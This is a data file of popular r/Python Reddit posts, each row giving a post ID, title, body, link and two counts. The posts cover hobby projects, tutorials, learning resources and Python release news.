hh8nz3,Got the shirt solely because I thought it would be funny to post it on this sub with this flair... counting this as my first dad joke,,https://i.redd.it/3v0fbth01l751.jpg,51,1154
a4m9ul,"Congratulations, we are (a bit) over 300K",,https://i.redd.it/g9i6gsgm6a321.jpg,47,1158
jhh8oa,Monitor your internet with python,,https://pythonprogramming.org/monitor-your-internet-with-python/,136,1149
exx72v,First thing I made on Python! Just a free fall simulator where you can choose the height and acceleration,,https://gfycat.com/foolhardyadmiredaplomadofalcon,68,1155
li4ky3,How to create a Discord bot with Python: Part 1 (Setting up),,https://youtu.be/XUCITCMSpIk,44,1155
128eq5o,TechCrunch | Python 4 To Be Renamed to Viper And Introduce TypeScript support,,https://www.techscrunch.dev/article/6427dc8a62a5b6758a10,96,1156
it4x8o,Python 3.9: All You need to know 👊,,https://ayushi7rawat.hashnode.dev/python-39-all-you-need-to-know,214,1147
d2c4rf,I started learning python about a month ago. Today I sat down and decided that I wanted to create tictactoe. And thats what I did. Felt so good when it all came together.,,https://i.redd.it/npqfbsf4atl31.png,148,1149
8tkgr5,My nephew got his first Raspberry Pi today :),,https://i.redd.it/te0bawyl90611.jpg,82,1143
y6fumv,PYTHON CHARTS: the Python data visualization site with more than 500 different charts with reproducible code and color tools,"Link: [https://python-charts.com/](https://python-charts.com/)  
Link (spanish version): [https://python-charts.com/es/](https://python-charts.com/es/)  


This site provides tutorials divided into chart types and graphic libraries:

https://preview.redd.it/6yk59rxp8eu91.png?width=748&format=png&auto=webp&s=0581694dcacd8d7e9e7909b2c13dd0b76f7bd64c

&#x200B;

The graphs can be filtered based on the library or chart type:

&#x200B;

https://preview.redd.it/dyo2btgz8eu91.png?width=1058&format=png&auto=webp&s=a22b43408411950c2351367a96e871279f368acc

&#x200B;

Each post contains detailed instructions about how to create and customize each chart. All the examples provide reproducible code and can be copied with a single click:

https://preview.redd.it/d681tn319eu91.png?width=1553&format=png&auto=webp&s=05fd21d7a896082753c55cec461df67460ee07fb

&#x200B;

The site also provides a color tool which allows copying the named, colors or its HEX reference:  


&#x200B;

https://preview.redd.it/ptwelwb99eu91.png?width=1299&format=png&auto=webp&s=54bc17e012790a55d62604f1d8a5fcb6565ab381

  
There is also a quick search feature which allows looking for charts:  


&#x200B;

https://preview.redd.it/gpoz93wd9eu91.png?width=1013&format=png&auto=webp&s=fa3af72c6b2ef43444278e74032a0ebae3d9c143

  
Hope you like it!",https://www.reddit.com/r/Python/comments/y6fumv/python_charts_the_python_data_visualization_site/,45,1144
ermgjg,Started learning Python a few months ago...today I finished my first game from scratch using Pygame!,,https://v.redd.it/5465buffz0c41,47,1144
10qv40g,"I’m developing a programming game where you use Python to automate all kinds of machines, robots, drones and more and solve exciting bite-sized coding challenges.","Six weeks ago, I announced JOY OF PROGRAMMING here on r/python and it was met with an overwhelmingly positive reception and a lot of valuable feedback. In case you missed it, the game is all about practicing and applying your Python skills to challenging tasks in realistic, physically simulated 3D environments. It will cover a wide variety of topics, from basic algo / ds, oop, GUI programming to control theory, robotics, image processing, machine learning, genetic algorithms, and more. Of course it will also include a basic tutorial for beginners, but I plan to include interesting challenges for all skill levels. In my day job I’m a CS professor, and this game actually started out as a tool I used in-class for my students. For the last 19 months I’ve been developing this prototype into a proper game.

Speaking of development, in these last 6 weeks I added a lot of new features, polished and cleaned up many things, and improved the API documentation and made everything fully pep8 compliant. Also I finally got around to recording a longer gameplay trailer, which is hot off the press and I’d like to share it with you. Please head over to the game’s Steam page where you can check it out (it’s the second video there, though I recommend watching the first teaser if you haven’t already).

[https://store.steampowered.com/app/2216770/JOY\_OF\_PROGRAMMING\_\_Software\_Engineering\_Simulator](https://store.steampowered.com/app/2216770/JOY_OF_PROGRAMMING__Software_Engineering_Simulator) 

I’m very much looking forward to your feedback or your questions, and of course if you have a Steam account and you like what you see, consider a wishlist. This really helps to “feed” Steam’s recommender algorithm to spread the word about JOY OF PROGRAMMING and hopefully getting more people into Python programming that way!",https://www.reddit.com/r/Python/comments/10qv40g/im_developing_a_programming_game_where_you_use/,102,1140
xxrs6j,"Im making a video editor in Python. Yes, i'm crazy. No, it wont lag","# NEW POST.
https://www.reddit.com/r/Python/comments/101hu89/i_am_still_making_a_video_editor_in_python_i_am/?utm_source=share&utm_medium=android_app&utm_name=androidcss&utm_term=1&utm_content=share_button

# Motive

I am making a video editor in Python due to a lack of free editors who have the features i want them to have, without needing a super beefy computer to run, I'm talking: keyframes, 3d animations, etc.

This was a spontaneus decision by me because a malaysian friend was forced to use kinemaster because his pcs have no more than a core 2 duo.

Why wont i use something else?

Because python is really easy to just get stuff working without making a ton of bullsh** boilerplate just to move an image in 3d or paste and image on top of another.

# The backstory

There is a genre of videos called ""crazy errors"" they were quite popular back in 2011-2014, they involve error messages popping up in rythm to music, making it look like a virus (the video itself was most commonly made in a video editor like premiere or vegas pro). It most commonly featured IOSYS's ""Marisa Stole the Precious Thing"", although other songs could appear too.


It was near the end of 2020, back then I found out that windows93.net has a crazy error program. The difference is, is that the errors that popup, are actually interactive and are real windows in the os. This blew my mind and i immediately needed to know how it worked.

Turns out, they used a MIDI for sequencing the errors! Each note did something, either open an error, clear the screen, show a bsod, etc. This blew my mind(Again!), because a midi is the perfect method for doing this.
DAWs support it, and whats better for syncing events to audio than a piano roll in a DAW?

I used that method for my first crazy error, it opened real windows on your computer and was quite resource intensive.

Uploaded it to Youtube, gained 340 subs, 35k views, etc etc, May of 2021 comes in and i want to do something different. I want to do a 100 sub special, but this time, a different OS.

""A different OS? How? You would have to get a vm! And even then, it cant be older than Windows 7!""

But what if the errors were fake?

What if they were just images that appeared on the screen?

Thats what i did. I learned PIL, made the special, it was only one type of error, but it taught me a lot.


The program saved each frame to a png, and then i had to use ffmpeg to generate a mp4 out of them.

After that i made a 3D one, and it was fake Windows 7 errors, but animated. Had to make an entire window system for that one, each error was an element in a list, holding info about the current animation frame, position, images, etc.

After that i made a Windows XP crazy error, which had a better version of the window system and was filled to the brim with moving windows, spamming, and a gun!

Then, i made an entire error generator! Which is extremely accurate and will be part of the editor. It even works on py-script! [relt-1.github.io/app/](https://relt-1.github.io/app/)  play with it!

And that brings us to the present, where i had a vision, of a huge 10 minute medley, with all the songs and oses, a tribute to the genre.
While i was making that, i got the idea for a crazy error maker, with the error generator built in. I thought to myself: ""If im making a crazy error editor, i might just make the tribute in it! To showcase the power of the program!""

# The how

Im using PIL for generating the frames. Pygame to display the playback. And tkinter for UI.

The timeline is rendered with PIL too!, a lot easier to manage an image than to use ui elements.

I use ""Keyframes"" for the error sequencing, currently theres only one keyframe type, but in the future, there will be a lot more of them, and even a 2d timeline!


Lets get real, Python is slow. But what isnt slow, is dictionary access.
If i can convey all the opened errors before the cursor in a string, i could save that in a dict, and then access it later instead of computing the frame all over again.

Coding in Python is like coding a C128, you'll feel awesome, until you have to optimize.

And if you wont optimize, you might aswell not code either.

I optimized it HARD. 60 fps playback even on crappy pcs. Thats what i mean.

Not only that, but the program features:

* WAV markers (USE THEM PLEASE THEY ARE IN FL STUDIO AND REAPER)

* BPM snapping

* Custom errors/images, you can already make some sh**posts with it!

* Custom animations. Did i mention the program has superaccurate windows 7 animations with data taken directly from the code? 3d Position, Rotation, and Pivot point.

* Aero blur.

* Background image

* Presets

* Automatic inactive windows


I am adding more features every day, which brings me to the

# Future of the project

I want this program to be a full on video editor. With video clips, text generator, special effects, and even some audio processing!

But before that, i have to complete the crazy error part.
Things to do:

* More oses

* Balloons

* UAC window

* Compositing manager (will make caching a lot faster)

* Closing windows (harder than it sounds actually)

* Layers

* Desktop generation

* probably even more.


# Videos

The project is in an early state. Everything is subject to change

WAV marker showcase
https://media.discordapp.net/attachments/1022791896067735602/1025732640080408626/2022-10-01_13-34-26.mp4

early custom animation
https://media.discordapp.net/attachments/1022791896067735602/1026538677532368936/pythonw_OpY2DRj1Wa.mp4

A small preview made in the program
https://media.discordapp.net/attachments/742311461631819786/1027499039249403934/a.mp4

More videos coming soon!

# I need your help!

I wouldnt call myself a pro at Python, thats why i need YOUR help! I doubt i'll finish this project just by myself. If you are interested and know anything about moviepy, kivy, pygame, pillow, etc. Please DM me on reddit or discord (Relt#4423), we can discuss.

# Download?

Here is the current source code:
https://github.com/relt-1/czeditor

# TL DR
I made a video editor for crazy error videos, but now i want it to be larger in scope.",https://www.reddit.com/r/Python/comments/xxrs6j/im_making_a_video_editor_in_python_yes_im_crazy/,207,1138
phz9a2,Python running without an OS!,,https://youtu.be/bYQ_lq5dcvM,33,1137
nmdy7n,"Used Python to build a r/wallstreetbets sentiment analyzing algo-trader (I used VADER sentiment analysis) -- 33% annual return ($16k). Source code, pictures, and results!","[Source code](https://github.com/tstewart161/Reddit_Sentiment_Trader)

[Hosted version](https://getquantbase.com) (how to actually run/invest in it). Folks the amount of y’all that have messaged me asking for this is absolutely AMAZING but I can’t keep up! Posting the link here for you guys

&#x200B;

HOW I DID THIS

Scraped WSB sentiment, got the top + most positively mentioned stocks on WSB (for the better part of this year, that's been $GME and $AMC, recently some $SPCE and $NVDA, and about 13 other stocks. I have the strategy rebalancing monthly. The source code is actually pretty intuitive, but essentially what it uses is VADER ( Valence Aware Dictionary for Sentiment Reasoning), which s a model used for text sentiment analysis that is sensitive to both polarity (positive/negative) and intensity (strength) of emotion.

The way it works is by relying on a dictionary that maps lexical (aka word-based) features to emotion intensities -- these are known as sentiment scores. The overall sentiment score of a comment/post is achieved by summing up the intensity of each word in the text.

In some ways, it's easy: words like ‘love’, ‘enjoy’, ‘happy’, ‘like’ all convey a positive sentiment. Also VADER is smart enough to understand the basic context of these words, such as “did not love” as a negative statement. It also understands the emphasis of capitalization and punctuation, such as “ENJOY” which is pretty cool. Phrases like “The acting was good , but the movie could have been better” have sentiments in both polarities, which makes this kind of analysis tricky -- essentially w VADER you would analyze which part of the sentiment here is more intense.

&#x200B;

**Results and some stats:**

Right now I'm up 60% YTD, compared to the SP500's 13% (the recent spikes in GME and AMC have helped tremendously)

\- The strategy is **backtested** only to the beginning of 2020, but I'm working on it. It's got an annualized return of 33% (compared to 16% for the SP500)

\- **Max drawdown of -8.7%** (aka how far it went down before coming back up -- interestingly enough, WallStreetBets weathered COVID pretty well)

&#x200B;

Happy to answer any more questions about the process/results. I think doing stuff like this is pretty cool as someone with a foot in algo trading and traditional financial markets",https://www.reddit.com/r/Python/comments/nmdy7n/used_python_to_build_a_rwallstreetbets_sentiment/,134,1140
kcdfv0,From complete beginner to django website,"6 months ago I’d never written a single line of code, in any language. I decided completely out of the blue to do a course on “coding for data analysis”, I very nearly picked one on human biology instead. It was just something to fill the lockdown boredom, but I quickly and unexpectedly started to enjoy it more and more.

Fast forward 3 months and I started learning html and then django. From that the idea to create www.rugbykickoff.com, which has just gone live now. 

I honestly can’t believe how quickly it was to pick the language up with the amount of help available online. 

I lost motivation several times getting completely lost at stack overflow answers where I didn’t understand a single concept etc. But this is testament to persevering and the massive amount of online support that’s available. 

To anyone in the same boat, don’t give up!",https://www.reddit.com/r/Python/comments/kcdfv0/from_complete_beginner_to_django_website/,92,1131
d8t3fu,I took some suggestions and improved my solar system generator with better rings and colorful stars,,https://i.redd.it/rei5amvbslo31.png,42,1134
u8j6fn,Unpopular opinion: Matplotlib is a bad library,"I work with data using Python a lot. Sometimes, I need to do some visualizations.  Sadly, matplotlib is the de-facto standard for visualization. The API of this library is a pain in the ass to work with. I know there are things like Seaborn which make the experience less shitty, but that's only a partial solution and isn't always easily available. Historically, it was built to imitate then-popular Matlab. But I don't like Matlab either and consider it's API and plotting capabilities very inferior to e.g. Wolfram Mathematica. Plus trying to port the already awkward Matlab API to Python made the whole thing double awkward, the whole library overall does not feel very Pythonic.

Please give a me better plotting libary that works seemlessly with Jupyter!",https://www.reddit.com/r/Python/comments/u8j6fn/unpopular_opinion_matplotlib_is_a_bad_library/,330,1132
l18b9m,I’m 36 and just starting to learn Python. Is it realistic to think I could get a job in this field by 40?,Hello Python peoples. I’m brand new to all this but I really enjoy it. I don’t know why I waited until this late in life to dig in. Is it too late? Can I actually become proficient within maybe 4 years or so? I make about 50k a year at my current job and can’t go much higher. I recently had a kid and want to earn more. I’d love to do so with programming somehow. Does this path make sense to pursue?,https://www.reddit.com/r/Python/comments/l18b9m/im_36_and_just_starting_to_learn_python_is_it/,346,1129
evolio,"I wrote a small library to enable flexible piping in Python, and finally happy with my live rendering setup in vim. Figured I'd make a small demo.",,https://i.redd.it/1mu67vncnqd41.gif,75,1135
fus3fe,I'm a non-native English speaker and when watching podcasts/movies very often I find myself googling definition of a word so I wrote a very simple command line tool in python to make the process a little bit quicker,,https://v.redd.it/fegtj44vcsq41,109,1124
i5dns2,The interactive python mode in VSCode is amazing,,https://youtu.be/lwN4-W1WR84,149,1123
qy4iym,You can insert Emoji using `\N{NAME_OF_EMOJI}`,,https://s1.gifyu.com/images/20211120_174559.jpg,89,1131
beiazl,Suitable tattoo,,https://i.redd.it/6acdc03ivys21.jpg,67,1126
an0kya,Best Python Cheatsheet Ever!,,https://gto76.github.io/python-cheatsheet/,69,1123
c1zx5f,Created a click bot after reading Automate boring stuff :),,https://v.redd.it/e9wzeo6ex2531,95,1122
13s7h2m,Realised Ive spent 10 hrs learning to automate a job that takes me 15 minutes a week,"And Im only half way through. 

worth_it = True 


Yes Im a noob",https://www.reddit.com/r/Python/comments/13s7h2m/realised_ive_spent_10_hrs_learning_to_automate_a/,249,1117
z8qstu,"Making €6,147,455 Overnight in in-game currency using Computer Vision","# A Python bot used to play the game 'City Island'

Gameplay:

https://reddit.com/link/z8qstu/video/596siu9n533a1/player

[For example: Closing a popup](https://i.redd.it/tdeex2b3333a1.gif)

# Why?

I've been playing strategy + city building + simulation? games like **TownsMen 6**, **Clash of the Clans**, and SimCity for the last 10 years.

On trying out **City Island 5** I found it mildly irritating that my collectables could not accumulate while I was outside the game. I might have had the best businesses, strategy, etc but I had to be in the game to ensure I collect the cash/keys/gold over time. For example, if my bakery makes €100 per minute I would only earn €100 after leaving the game and coming back 24 hours later.

This became especially tiresome while trying to accumulate €5,000,000 required to buy the island shown below. This would take me roughly two weeks of gameplay if I don't spend any money - it's not worth it.

&#x200B;

[Island I wanted to buy](https://preview.redd.it/6x6t11ig333a1.png?width=1990&format=png&auto=webp&s=a836a96daa48ab5649edcfef8eb94baf5a2d4738)

&#x200B;

This is a problem that can be solved using one of the greatest tools in my tool belt - programming.

I decided to create a Python bot used to play the game using computer vision and image processing techniques. The bot should be able to play the game without any human intervention.

\---

# Results after running overnight

I started the game with €316,415:

https://preview.redd.it/he8i7q9y433a1.png?width=3360&format=png&auto=webp&s=b809f95311c59055abcc267841a94eb5a79882d9

The following morning I had €6,463,870:

https://preview.redd.it/t1w46e9d433a1.png?width=3360&format=png&auto=webp&s=4e8f9b901bd85897220e5f67d5bfdb1f6263e33c

I made €6,147,455 overnight!

I then proceeded to buy the Island I wanted:

https://preview.redd.it/h4fd7ehf433a1.png?width=3360&format=png&auto=webp&s=aefc5ce2c53d4395f4b871752b5a6df901ef689f

# Source code & guide

A basic guide on how I achieved it - [https://paulonteri.com/thoughts/play-game-with-computer-vision](https://paulonteri.com/thoughts/play-game-with-computer-vision)

Source code - [https://github.com/paulonteri/play-game-with-computer-vision](https://github.com/paulonteri/play-game-with-computer-vision)",https://www.reddit.com/r/Python/comments/z8qstu/making_6147455_overnight_in_ingame_currency_using/,118,1118
kcyg3o,willmcgugan/rich Rich is a Python library for rich text and beautiful formatting in the terminal.,,https://github.com/willmcgugan/rich#status,56,1123
fyvt4l,I made a script to automatically log into my zoom meetings and record it.,,https://v.redd.it/3u6mw8q714s41,142,1117
ns8gba,Free Python Learning Resource Provided by Microsoft,"Came across this platform today called [Microsoft Learn](https://docs.microsoft.com/en-us/learn/), which provides free training to learn different skills related to different technologies. Each course is designed as a module, in each module, it contains different lessons and exercises. Below are the modules related to Python learning.

# Beginners Courses

* [What is Python?](https://docs.microsoft.com/en-us/learn/modules/python-introduction/)
* [Take your first steps with Python](https://docs.microsoft.com/en-us/learn/paths/python-first-steps/)
* [Set up your Python beginner development environment with Visual Studio Code](https://docs.microsoft.com/en-us/learn/modules/python-install-vscode/)
* [Introduction to Python](https://docs.microsoft.com/en-us/learn/modules/intro-to-python/)
* [Branch code execution with the if...elif...else statement in Python](https://docs.microsoft.com/en-us/learn/modules/python-if-elif-else/)
* [Manipulate and format string data for display in Python](https://docs.microsoft.com/en-us/learn/modules/python-format-strings/)
* [Perform mathematical operations on numeric data in Python](https://docs.microsoft.com/en-us/learn/modules/python-datatypes-numeric-operations/)
* [Iterate through code blocks by using the while statement](https://docs.microsoft.com/en-us/learn/modules/python-while/)
* [Import standard library modules to add features to Python programs](https://docs.microsoft.com/en-us/learn/modules/python-standard-library/)
* [Create reusable functionality with functions in Python](https://docs.microsoft.com/en-us/learn/modules/python-functions/)
* [Manage a sequence of data by using Python lists](https://docs.microsoft.com/en-us/learn/modules/python-lists/)
* [Write basic Python in Notebooks](https://docs.microsoft.com/en-us/learn/modules/basic-python-nasa/)
* [Count the number of Moon rocks by type using Python](https://docs.microsoft.com/en-us/learn/modules/count-moon-rocks-python-nasa/)
* [Code control statements in Python](https://docs.microsoft.com/en-us/learn/modules/intermediate-python-nasa/)
* [Introduction to Python for space exploration](https://docs.microsoft.com/en-us/learn/modules/introduction-python-nasa/)
* [Install coding tools for Python development](https://docs.microsoft.com/en-us/learn/modules/install-code-tools-python-nasa/)
* [Discover the role of Python in space exploration](https://docs.microsoft.com/en-us/learn/paths/introduction-python-space-exploration-nasa/)
* [Crack the code and reveal a secret with Python and Visual Studio Code](https://docs.microsoft.com/en-us/learn/modules/secret-message/)
* [Introduction to object-oriented programming with Python](https://docs.microsoft.com/en-us/learn/modules/python-object-oriented-programming/)
* [Use Python basics to solve mysteries and find answers](https://docs.microsoft.com/en-us/learn/paths/python-partnership/)
* [Predict meteor showers by using Python and Visual Studio Code](https://docs.microsoft.com/en-us/learn/modules/predict-meteor-showers-using-python/)
* [Plan a Moon mission by using Python panda](https://docs.microsoft.com/en-us/learn/modules/plan-moon-mission-using-python-pandas/)

# Intermediate Courses

* [Create machine learning models](https://docs.microsoft.com/en-us/learn/paths/create-machine-learn-models/)
* [Explore and analyze data with Python](https://docs.microsoft.com/en-us/learn/modules/explore-analyze-data-with-python/)
* [Build an AI web app by using Python and Flask](https://docs.microsoft.com/en-us/learn/modules/python-flask-build-ai-web-app/)
* [Get started with Django](https://docs.microsoft.com/en-us/learn/modules/django-get-started/)
* [Architect full-stack applications and automate deployments with GitHub](https://docs.microsoft.com/en-us/learn/modules/automate-deployments-github-actions-azure/)",https://www.reddit.com/r/Python/comments/ns8gba/free_python_learning_resource_provided_by/,24,1117
d6v523,I have simulated ray-tracing in pygame! You can check it out here: https://github.com/kubapilch/Ray-Tracing,,https://i.redd.it/24lhgahm6rn31.gif,78,1117
j5mh4a,Python 3.9.0 final released,,https://www.python.org/downloads/release/python-390/,161,1115
la04qd,A list of 30 Python language tricks,"I wrote this article, [30 Python Language Tricks](https://medium.com/pythonland/30-python-language-tricks-that-will-make-you-a-better-coder-f08f811a7b0f?sk=f140c6aa3a21d4f39065ca3827836456), on Medium. it's a ""friend link"" which bypasses the paywall. It contains a wide selection of topics, for both beginners and more advanced level programmers. Enjoy and let me know if you liked it!",https://www.reddit.com/r/Python/comments/la04qd/a_list_of_30_python_language_tricks/,83,1108
gb4kg3,"My First Python Script : You input coordinates, It gives you a bunch of sociodemographic data describing its location (population, age, income, and more). Its super slow but eh, i'm damn proud of it!",,https://i.redd.it/ruk5tl8ku0w41.jpg,85,1108
a8g2ne,Xpost from Woodworking,,https://i.redd.it/bcid8lkawm521.jpg,85,1104
oo116s,I got a job!,"After starting to learn to code March last year, I was instantly hooked! Well all that time messing around with Python has worked, as I start a new job as a Senior Data Engineer in September!

It feels weird being a Senior Data Engineer having never been a Junior, but the new job is within the same company, and they’ve been massively increasing their data engineering resource, so it starts with a boot camp, as part of a conversion course. So it’s a chance to learn through courses at the same time which I’m so excited for! 

I’m quite nervous having never written a single line of code in a work environment but looking forward to the challenge! 

I wanted to share this with the community here because it’s been a massive help and inspiration along the journey! Thank you all!",https://www.reddit.com/r/Python/comments/oo116s/i_got_a_job/,115,1101
fcawh0,I made GUI based app which lets you create and train simple feed forward neural networks.,,https://v.redd.it/0hu5lnwwy8k41,58,1106
6h2g42,"NumPy receives first ever funding, thanks to Moore Foundation",,https://www.numfocus.org/blog/numpy-receives-first-ever-funding-thanks-to-moore-foundation/,66,1099
5y2boe,CIA uses Python (a lot),"From the latest [Vault 7 leaks](https://wikileaks.org/ciav7p1/cms/index.html) from Wikileaks, we can see that CIA uses a lot of Python in its secret hacking tools.

Most notably in the Assassin, Caterpillar, MagicViking and Hornet projects.

Unfortunatelly, no files from these projects have been released yet. But if you look at the dump that was released, there are plenty of .py files, and even PIL is included.

There are even Coding Conventions: https://wikileaks.org/ciav7p1/cms/page_26607631.html

You can see more Python-related stuff here: https://search.wikileaks.org/?query=python&exact_phrase=&any_of=&exclude_words=&document_date_start=&document_date_end=&released_date_start=&released_date_end=&publication_type%5B%5D=51&new_search=False&order_by=most_relevant#results",https://www.reddit.com/r/Python/comments/5y2boe/cia_uses_python_a_lot/,221,1101
jrkseu,Let's make a Simple Voice Assistant like J.A.R.V.I.S using Python [for Beginners & Intermediates],"Hey guys, I'm back with another interesting tutorial. In this tutorial, you will learn how to build your own personal voice assistant like Jarvis using Python.

You can find the complete tutorial here on my blog - [https://thecodingpie.com/post/how-to-build-your-own-python-voice-assistant-thecodingpie/](https://thecodingpie.com/post/how-to-build-your-own-python-voice-assistant-thecodingpie/)

I hope you will love it. I tried my best to make this tutorial fun and beginner-friendly. So fear not! If you got stuck, I am always here to help you :) As always, any feedback is accepted...",https://www.reddit.com/r/Python/comments/jrkseu/lets_make_a_simple_voice_assistant_like_jarvis/,74,1101
h0su23,Playing Space Invades created in pygame with hand gestures using OpenCV and CNNs,,https://v.redd.it/7naml0zxu7451,45,1097
eq30cd,I made metaballs. Works quite fast. https://github.com/Norne9/metaballs,,https://v.redd.it/xepyyyzucdb41,64,1099
edpvnh,I wrote a Python script to generate your personal YouTube report.,,https://i.redd.it/5zjxlrgvmz541.jpg,97,1099
cuhsmc,My little project,,https://v.redd.it/g7plxy0ho8i31,97,1103
g0mmbt,I made a web app to convert baking recipes from volume to weight,,https://i.redd.it/4q2e4ti96ms41.gif,45,1102
h97d6h,I taught myself web scraping today! Made an app to tell you the weather at a zip code.,,https://i.redd.it/3r2tv8pvkz451.png,91,1099
b413ly,Real-Time Hand Gesture Recognition,,https://v.redd.it/33mz20h0uln21,52,1099
ar9s51,A line follower robot my classmade and i made with python for our minor project. Turned out working great :D,,https://v.redd.it/hyntwc2r8yg21,46,1098
hth0qs,What stuff did you automate that saved you a bunch of time?,"I just started my python automation journey. 

Looking for some inspiration.

Edit: Omg this blew up! Thank you very much everyone. I have been able to pick up a bunch of ideas that I am very interested to work on :)",https://www.reddit.com/r/Python/comments/hth0qs/what_stuff_did_you_automate_that_saved_you_a/,550,1095
gerasc,"Tower defense project - in game Dev view, random path offsets, animated towers and mobs - collectable with mouse/seeking coins - My first proper bespoke project (Pygame)",,https://i.redd.it/rdtnfwcv77x41.gif,60,1088
jeu0xq,Yury Selivanov on Twitter: Python 3.10 will be up to 10% faster,,https://twitter.com/1st1/status/1318558048265404420,76,1094
9dpiuu,"Just started Python, felt pretty good to write a script that did my homework for me👌",,https://i.redd.it/n9ddf4ei0qk11.jpg,200,1091
n3a6ie,"My trailer was stolen late last week, so I wrote a Craigslist scraper so I can see if anyone tries to sell it. (With repo link)","I was beyond livid when I found my trailer was stolen, so I did the only thing I could do, outside of waiting for the police to find something... I wrote this scraper.

[CLAPI](https://github.com/Absolute-Tinkerer/CLAPI)

It's pretty basic right now since I wanted something quick. My use case is primarily through the viewer, but I'm sure there are other applications.",https://www.reddit.com/r/Python/comments/n3a6ie/my_trailer_was_stolen_late_last_week_so_i_wrote_a/,59,1084
ifukmz,Free Python for Data Analytics Course,"Hi,

I  am a self-taught Analytics professional from a small town in India. I  am a long time lurker here on Reddit and I finally have something to  share with this community.

I have  extensive experience in Python and Machine Learning working in companies  like Citi Bank and Flipkart (a Walmart's subsidiary in India). I have  created a small Python course all inside Jupyter Notebook. All you need  to do is to import the notebook files and you can learn the topics and  run the codes - all inside the notebook file itself. I believe that  these notebooks will be more than enough for you to get started in  Python and you might not need to do any other basic Python course  online.

Jupyter Notebook files are available [here](https://github.com/ItsAwSM/Python-for-Data-Analytics).

I also have created videos on the notebooks if you need any added explanation. They are on my channel [here](https://www.youtube.com/c/UtsavAwasthiX/videos)

|| ज्ञानं परमं बलम् ||

(knowledge is power supreme)

&#x200B;

Edit: Thank You for overwhelming response. I will comment from my alternate account. u/flipkartamazon, keeping main for personal use. Thank you all for upvotes and awards.",https://www.reddit.com/r/Python/comments/ifukmz/free_python_for_data_analytics_course/,85,1084
9pu15b,Super Potato Bruh is now on Steam! - Made in pure Python & Pygame - Source code on itch.io!,,https://v.redd.it/ga7v0ioqact11,105,1086
1fymy0,"I got a funny error trying to open a file, and decided to illustrate it.",,http://i.imgur.com/To3DQ6J.jpg,47,1086
bd355n,Created a webapp that displays the bond-line structure of any chemical compound/molecule.,,https://i.redd.it/mqipsf6tl8s21.png,53,1087
lwpofb,The Self-Taught Programmer (For Python) Udemy Course is Free (I think only for today),"Just came across the information from a friend of mine that The Self-Taught Programming Udemy course is free today (with free coupon code). Course is rated 4.6/5, so I think it is pretty solid.

[Udmey Course Link](https://www.udemy.com/course/self-taught-programmer/?couponCode=0A41815BD0D750D1595D) (Coupon is already applied)",https://www.reddit.com/r/Python/comments/lwpofb/the_selftaught_programmer_for_python_udemy_course/,122,1084
fjemrj,Made a reaction time game for my first pygame project.,,https://i.redd.it/yzat15ofhym41.gif,56,1085
69ws4c,10 awesome features of Python that you can't use because you refuse to upgrade to Python 3,,http://www.asmeurer.com/python3-presentation/slides.html#1,295,1085
gk8jio,"I made a derivative calculator! (For product rule and quotient rule only, as of now). Just started coding and there's still a lot to improve, but I'm so happy with this.",,https://v.redd.it/9kxbcx4fdxy41,67,1087
t7zbbc,An Interactive Cheat Sheet That Just Gives You The Answer,"After realizing I was spending way too much time looking for answers instead of coding. Thinking there must be a better way but not finding what I want, I created this...

The Python SpeedSheet: https://speedsheet.io/s/python

This is an interactive cheat sheet. It is a simple idea, just type what you want into the search bar and it displays the answer.

This sheet covers the core Python language. The sheet has doubled in size since I first posted about it last year and the search has been improved. It is definitely not perfect and I'm sure it is still lacking some important features but I personally find it incredibly useful.

Here is a video on how it works:

https://www.youtube.com/watch?v=66RumAF50_4

TLDR:

This is an interactive cheat sheet for Python.",https://www.reddit.com/r/Python/comments/t7zbbc/an_interactive_cheat_sheet_that_just_gives_you/,83,1081
b7cy5y,Super Potato Bruh (my Python Indie project) has received a major update!,,https://i.redd.it/edmiqi4n6ap21.gif,94,1078
m6a268,10+ Year CS Teacher here. What I'm doing and why I'm doing it,"So, here's what I'm doing and why I'm doing it.

I've been a high school Computer Science teacher for over 10 years (like 11ish but who's counting at this point...)

I have always taught kids in my room but I started teaching an AP Computer Science course in java virtually two years ago. This was all fine and good but I got interested in providing my own a-synchronous resources for my students to make learning virtually more accessible. Fast forward a year and we've convinced my district that if I can make video series for students to learn introduction programming then it will help non-trained teachers offer these courses to students at smaller rural schools where there are less course offerings.

That triggered me getting to produce my Arduino course. Then this year, expedited by the pandemic and the need for virtual resources, I got to build my Python course. Next up is building a full Java course that hits on everything in the AP Computer Science A curriculum.

I know there's a million resources out there and I was doing it for my district and my students, but I figured if I'm going to be doing it anyway, I might as well share it with a broader audience. So, with permission, I ""branded"" the content and published it all on YouTube.

Anyway, from one CS teacher to a bunch of humans trying to learn how to code: I hope it's helpful.

Link to YT Channel: [https://www.youtube.com/c/CodeWithConner](https://www.youtube.com/c/CodeWithConner)

Link to my site: [https://www.codewithconner.ca/](https://www.codewithconner.ca/)

Happy Tuesday, may your BTC/GME go to the moon (if that's your thing) :)",https://www.reddit.com/r/Python/comments/m6a268/10_year_cs_teacher_here_what_im_doing_and_why_im/,89,1078
ybf948,"Pyxel, a retro game engine for Python, reaches 300,000 downloads!"," Thanks to all of you, downloads of Pyxel, a retro game engine for Python, have reached 300,000!

Pyxel is a game engine that is free, comes with tools, and can run in a web browser.

Installation and usage instructions can be found on the GitHub site: [https://github.com/kitao/pyxel](https://github.com/kitao/pyxel)

Since it supports web browsers, games and tools created with Pyxel can be tried out immediately without prior preparation.

For example, here is a platformer that comes as a sample (Be warned, it's difficult!): [https://kitao.github.io/pyxel/wasm/examples/10\_platformer.html](https://kitao.github.io/pyxel/wasm/examples/10_platformer.html)

This is a game created by users (which is also difficult!): [https://kitao.github.io/pyxel/wasm/examples/megaball.html](https://kitao.github.io/pyxel/wasm/examples/megaball.html)

You can also try the included image/sound editing tools in your browser: [https://kitao.github.io/pyxel/wasm/examples/image\_editor.html](https://kitao.github.io/pyxel/wasm/examples/image_editor.html) [https://kitao.github.io/pyxel/wasm/examples/sound\_editor.html](https://kitao.github.io/pyxel/wasm/examples/sound_editor.html)

Since Pyxel can be used as a Python module, it can be combined with other AI libraries. Hopefully, your ideas will continue to create interesting applications in the future!",https://www.reddit.com/r/Python/comments/ybf948/pyxel_a_retro_game_engine_for_python_reaches/,45,1071
ajrkh7,EVERY. TIME.,,https://i.redd.it/15fbl9p8xlc21.png,144,1069
7pid7p,What a surprise: had some Python swag in the mail today!,,https://i.imgur.com/1Tjtt9h.jpg,31,1075
kfq7iw,Pygame 3D Graphics,"i made a DOOM style engine in pygame

https://reddit.com/link/kfq7iw/video/ac31q76ljz561/player",https://www.reddit.com/r/Python/comments/kfq7iw/pygame_3d_graphics/,50,1076
